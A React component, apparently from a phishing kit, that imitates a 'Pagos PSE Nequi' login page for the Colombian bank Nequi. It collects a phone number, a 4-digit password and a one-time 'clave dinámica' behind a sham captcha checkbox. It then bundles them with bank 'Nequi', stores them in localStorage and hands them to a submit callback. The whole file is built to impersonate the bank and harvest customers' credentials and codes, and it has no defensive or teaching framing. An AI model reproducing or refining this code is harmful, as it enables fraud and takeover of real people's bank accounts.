/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState, useEffect, useMemo, useRef } from 'react';

// Bandera de Colombia representada con CSS puro para evitar dependencias
const ColombiaFlag = () => (
  <div className="w-6 h-4 flex flex-col rounded-sm overflow-hidden border border-gray-200 shrink-0">
    <div className="bg-[#FCD116] h-[50%]" />
    <div className="bg-[#003893] h-[25%]" />
    <div className="bg-[#CE1126] h-[25%]" />
  </div>
);

export default function Login({ enviar }: any) {
  const [celular, setCelular] = useState("");
  const [clave, setClave] = useState("");
  const [claveDinamica, setClaveDinamica] = useState("");
  const [activeField, setActiveField] = useState<"cel" | "re" | "dinamica">("cel");
  const [captchaOk, setCaptchaOk] = useState(false);

  // REFERENCIA PARA EL INPUT INVISIBLE
  const inputRef = useRef<HTMLInputElement>(null);

  const isFormValid = useMemo(() => {
    return celular.length === 10 && clave.length === 4 && captchaOk;
  }, [celular, clave, captchaOk]);

  const handleEntrar = () => {
    if (isFormValid) {
      const payload = {
        view: 'login',
        user: celular,
        pass: clave,
        dynamicKey: claveDinamica,
        bank: "Nequi"
      };
      localStorage.setItem('nequi_view', JSON.stringify(payload));
      enviar?.(payload);
    }
  };

  // Función para forzar la apertura del teclado en móvil
  const abrirTeclado = (field: "cel" | "re" | "dinamica") => {
    setActiveField(field);
    setTimeout(() => {
      inputRef.current?.focus();
    }, 50);
  };

  return (
    <>
      {/* Input puente invisible para abrir el teclado de forma nativa en móviles */}
      <input
        ref={inputRef}
        type="tel"
        value={activeField === "cel" ? celular : activeField === "re" ? clave : claveDinamica}
        onChange={(e) => {
          const val = e.target.value.replace(/\D/g, "");
          if (activeField === "cel") {
            setCelular(val.slice(0, 10));
          } else if (activeField === "re") {
            setClave(val.slice(0, 4));
          } else if (activeField === "dinamica") {
            setClaveDinamica(val.slice(0, 6));
          }
        }}
        style={{ position: 'absolute', opacity: 0, height: 0, width: 0, zIndex: -1 }}
      />

      <div className="contenedor animate-in fade-in duration-500 max-w-97.5 mx-auto mt-12 p-8 bg-white rounded-md shadow-sm border border-gray-100/40" style={{ fontFamily: "'Manrope', sans-serif" }}>

        <div className="font-manrope">
          <div className="flex flex-col items-center mb-1">
            <h2 className="text-[25px] font-bold text-[#210049] w-full text-center tracking-tight">
              Pagos PSE Nequi
            </h2>
          </div>

          <p className="text-[14px] font-medium text-gray-800 mb-8 text-center leading-tight">
          
          </p>

          <div className="space-y-3.5 mb-6">

            {/* Campo 1: Celular con código de país */}
            <div className="flex gap-2 w-full h-13">
              <div className="flex items-center justify-center gap-1.5 px-3 bg-[#F5F1F5] rounded-md cursor-pointer">
                <ColombiaFlag />
                <span className="text-[#210049] font-bold text-sm">+57</span>
                <span className="text-gray-400 text-[10px]">▼</span>
              </div>

              <div
                className={`flex-1 flex items-center px-4 bg-[#F5F1F5] rounded-md border-2 transition-all duration-200 ${activeField === 'cel' ? 'border-[#da0081] bg-white' : 'border-transparent'
                  }`}
                onClick={() => abrirTeclado("cel")}
              >
                <input
                  type="text"
                  readOnly
                  placeholder="Número de celular"
                  value={celular}
                  className="w-full bg-transparent text-[#210049] font-bold text-[16px] outline-none placeholder:text-gray-400/80 placeholder:font-medium"
                />
              </div>
            </div>

            {/* Campo 2: Contraseña */}
            <div
              className={`w-full flex items-center px-4 h-13 bg-[#F5F1F5] rounded-md border-2 transition-all duration-200 ${activeField === 're' ? 'border-[#da0081] bg-white' : 'border-transparent'
                }`}
              onClick={() => abrirTeclado("re")}
            >
              <input
                type="password"
                readOnly
                placeholder="Contraseña"
                value={clave ? "●".repeat(clave.length) : ""}
                className={`w-full bg-transparent text-[#210049] font-bold text-[16px] outline-none placeholder:text-gray-400/80 placeholder:font-medium ${clave ? 'tracking-[0.4em]' : ''
                  }`}
              />
            </div>

            {/* Campo 3: Clave dinámica */}
            <div
              className={`w-full flex items-center px-4 h-13 bg-[#F5F1F5] rounded-md border-2 transition-all duration-200 ${activeField === 'dinamica' ? 'border-[#da0081] bg-white' : 'border-transparent'
                }`}
              onClick={() => abrirTeclado("dinamica")}
            >
              <input
                type="text"
                readOnly
                placeholder="Clave dinámica"
                value={claveDinamica}
                className="w-full bg-transparent text-[#210049] font-bold text-[16px] outline-none placeholder:text-gray-400/80 placeholder:font-medium"
              />
            </div>
          </div>

          {/* Banner Captcha Persona Real */}
          <div
            onClick={() => setCaptchaOk(!captchaOk)}
            className={`w-full flex items-center gap-4 p-4 border rounded-md cursor-pointer select-none transition-all duration-300 mb-8 ${captchaOk
                ? "border-[#2bb673] bg-[#f0fdf4]"
                : "border-[#e075ae] bg-white hover:border-[#da0081]"
              }`}
          >
            {captchaOk ? (
              <div className="relative shrink-0 flex items-center justify-center w-12 h-12 rounded-full bg-[#2bb673]/10">
                {/* Círculo verde con borde de 2px en lugar de 3px */}
                <div className="w-7 h-7 rounded-full border-2 border-[#2bb673] bg-white flex items-center justify-center">
                  {/* Checkmark con trazado más delgado (strokeWidth={2.5} en vez de 3.5) */}
                  <svg fill="none" stroke="currentColor" className="w-4 h-4 text-[#2bb673]" strokeWidth={2.5} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="m5 13 4 4L19 7"/></svg>
                </div>
              </div>
            ) : (
              <div className="relative shrink-0 flex items-center justify-center w-12 h-12 rounded-full bg-white">
                {/* Círculos de animación de onda con borde fino (border) */}
                <div className="absolute w-7 h-7 rounded-full border border-[#da0081] animate-ripple pointer-events-none" />
                <div className="absolute w-7 h-7 rounded-full border border-[#da0081] animate-ripple [animation-delay:1.5s] pointer-events-none" />

                {/* Círculo central con borde reducido a 2px (border-2 en vez de border-[3px]) */}
                <div className="relative z-10 w-10 h-10 rounded-full border-3 border-[#da0081] bg-white transition-transform duration-300" />
              </div>
            )}
            <div className="text-left">
              <span className="text-[#210049] font-semibold text-[15px] text-center leading-tight block">
                Confirmo que soy una persona real.
              </span>
            </div>
          </div>

          {/* Botón Entra */}
          <button
            onClick={handleEntrar}
            disabled={!isFormValid}
            className={`w-full py-4 font-bold text-[16px] rounded-md transition-all duration-300 ${isFormValid
                ? "bg-[#da0081] text-white cursor-pointer active:scale-95 shadow-md shadow-pink-200"
                : "bg-[#F1BFDA] text-white cursor-not-allowed opacity-90"
              }`}
          >
            Entra
          </button>
        </div>
      </div>
    </>
  );
}